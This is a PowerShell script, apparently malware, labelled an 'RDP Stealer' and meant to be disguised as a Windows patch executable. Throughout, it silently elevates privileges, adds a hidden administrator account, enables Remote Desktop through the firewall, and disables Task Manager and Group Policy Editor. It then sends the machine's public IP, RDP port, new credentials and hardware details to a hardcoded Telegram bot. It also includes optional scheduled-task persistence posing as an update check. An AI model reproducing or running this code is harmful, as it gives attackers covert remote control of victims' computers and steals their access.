# WindowsCriticalPatch.ps1 - Advanced RDP Stealer Honeypot by DreadCipher
# Creates admin user, enables RDP, locks down system, snitches IP:port + specs to Telegram, forces admin
# Designed for .exe conversion as WindowsCriticalPatch.exe

# Config
$TelegramBotToken = "7733366488:AAHFBq_N1Ix-DFnzbw7nIrc_TDxZYo_hJME"  # BotFather token
$TelegramChatID = "-1002050197092"      # Your chat ID
$NewUser = "PatchAdmin"             # New user
$NewPass = -join ((65..90) + (97..122) + (48..57) | Get-Random -Count 12 | ForEach-Object { [char]$_ })  # Random 12-char password

# Suppress all output
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# Force admin elevation
$currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try {
        $argList = "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
        Start-Process powershell.exe -Verb RunAs -ArgumentList $argList -ErrorAction Stop
    } catch {
        exit  # Silent exit if elevation fails or UAC canceled
    }
    exit  # Exit non-admin instance
}

# Create new user and grant admin rights
try {
    net user $NewUser $NewPass /add /y | Out-Null
    net localgroup Administrators $NewUser /add | Out-Null
} catch {
    exit  # Fail silently
}

# Enable and configure RDP
try {
    $rdpEnabled = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections").fDenyTSConnections
    if ($rdpEnabled -eq 1) {
        Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0 | Out-Null
        netsh advfirewall firewall set rule group="remote desktop" new enable=Yes | Out-Null
    }
    # Grant RDP access to new user
    $regPath = "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp"  # Fixed typo from 'Winstations'
    $acl = Get-Acl -Path $regPath
    $rule = New-Object System.Security.AccessControl.RegistryAccessRule ($NewUser, "FullControl", "Allow")
    $acl.SetAccessRule($rule)
    Set-Acl -Path $regPath -AclObject $acl | Out-Null
    net localgroup "Remote Desktop Users" $NewUser /add | Out-Null
} catch {
    # Keep going if RDP tweaks fail—user’s still created
}

# Lock down system
try {
    # Restrict Group Policy Editor (gpedit.msc) for current user
    $gpoRegPath = "HKCU:\Software\Policies\Microsoft\MMC\{5D6179C8-17EC-11D1-9AA9-00C04FD8FE93}"
    if (-not (Test-Path $gpoRegPath)) {
        New-Item -Path $gpoRegPath -Force | Out-Null
    }
    Set-ItemProperty -Path $gpoRegPath -Name "Restrict_Run" -Value 1 -Type DWord | Out-Null

    # Disable Task Manager for all users
    $taskMgrRegPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    if (-not (Test-Path $taskMgrRegPath)) {
        New-Item -Path $taskMgrRegPath -Force | Out-Null
    }
    Set-ItemProperty -Path $taskMgrRegPath -Name "DisableTaskMgr" -Value 1 -Type DWord | Out-Null
} catch {
    # Fail silently if lockdown fails
}

# Get RDP port
try {
    $RdpPort = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "PortNumber").PortNumber
    if (-not $RdpPort -or $RdpPort -eq 0) {
        $RdpPort = 3389  # Default fallback
    }
} catch {
    $RdpPort = 3389  # Default fallback
}
# Double-check with netstat
try {
    $netstat = netstat -ano | Select-String "LISTENING" | Select-String ":$RdpPort"
    if (-not $netstat) {
        $RdpPort = 3389  # Revert to default if no listener
    }
} catch {
    $RdpPort = 3389
}

# Grab IPs
try {
    $PublicIP = (Invoke-WebRequest -Uri "http://ipinfo.io/ip" -UseBasicParsing).Content.Trim()
    $LocalIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress | Select-Object -First 1
} catch {
    $PublicIP = "Unknown (IP grab failed)"
    $LocalIP = "Unknown (Local IP failed)"
}

# Get system info
try {
    $Ram = [math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
    $Cores = (Get-CimInstance Win32_Processor).NumberOfLogicalProcessors
    $Drive = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='C:'"
    $TotalStorage = [math]::Round($Drive.Size / 1GB, 2)
    $UsedStorage = [math]::Round(($Drive.Size - $Drive.FreeSpace) / 1GB, 2)
    $Uptime = (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
    $TimeSpan = (Get-Date) - $Uptime
    $UptimeStr = "$($TimeSpan.Days)d $($TimeSpan.Hours)h $($TimeSpan.Minutes)m"
} catch {
    $Ram = "Unknown"
    $Cores = "Unknown"
    $TotalStorage = "Unknown"
    $UsedStorage = "Unknown"
    $UptimeStr = "Unknown"
}

# Build snitch payload
$IpPort = if ($PublicIP -ne "Unknown" -and $RdpPort) { "$PublicIP`:$RdpPort" } else { "Unknown" }
$Message = "🛡️ WindowsCriticalPatch Hit!`nIP: $IpPort (Local: $LocalIP)`nUser: $NewUser`nPassword: $NewPass`nRAM: $Ram GB`nCores: $Cores`nStorage: $UsedStorage GB / $TotalStorage GB`nUptime: $UptimeStr`nTime: $(Get-Date)"

# Send to Telegram
try {
    $Uri = "https://api.telegram.org/bot$TelegramBotToken/sendMessage?chat_id=$TelegramChatID&text=$($Message | Out-String)"
    Invoke-WebRequest -Uri $Uri -Method Post -UseBasicParsing | Out-Null
} catch {
    # Silent fail if Telegram’s down
}

# Optional persistence (uncomment to enable)
<#
try {
    $TaskName = "WindowsUpdateCheck"
    $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    $TaskTrigger = New-ScheduledTaskTrigger -Daily -At "3AM"
    Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Description "Windows Update Check" -Force | Out-Null
} catch {
    # Fail silently
}
#>

# Exit silently
exit
